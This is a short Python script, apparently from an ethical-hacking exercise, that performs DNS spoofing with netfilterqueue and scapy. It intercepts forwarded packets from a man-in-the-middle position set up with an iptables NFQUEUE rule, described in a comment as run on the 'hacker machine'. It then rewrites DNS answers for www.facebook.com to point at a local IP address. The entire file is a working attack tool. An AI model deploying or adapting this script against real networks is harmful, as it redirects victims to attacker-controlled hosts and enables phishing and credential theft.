#!usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):  #DNSRR: response, DNSQR: request
        qname=scapy_packet[scapy.DNSQR].qname
        if 'www.facebook.com' in qname:  #qname is array, only spoof this domain
            # scapy_packet.show()
            answer = scapy.DNSRR(rrname="www.facebook.com", rdata="192.168.209.138") #create DNSRR instance with rrname and rdata
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount=1 #change num of dnsrr in an

            # remove len and checksum in IP and UDP layer, scapy will add automally
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            scapy_packet.show()
            packet.set_payload(str(scapy_packet)) #set payload


    packet.accept()
    # packet.drop()



#iptables -I FORWARD -j NFQUEUE  --queue-num 0
#execute in hacker machine to create a queue
queue = netfilterqueue.NetfilterQueue() #create instance
queue.bind(0, process_packet)
queue.run()# connect with the we create in hacker machine ,
                                # 0: number of queue, process_packet: callback whenever get packet in queue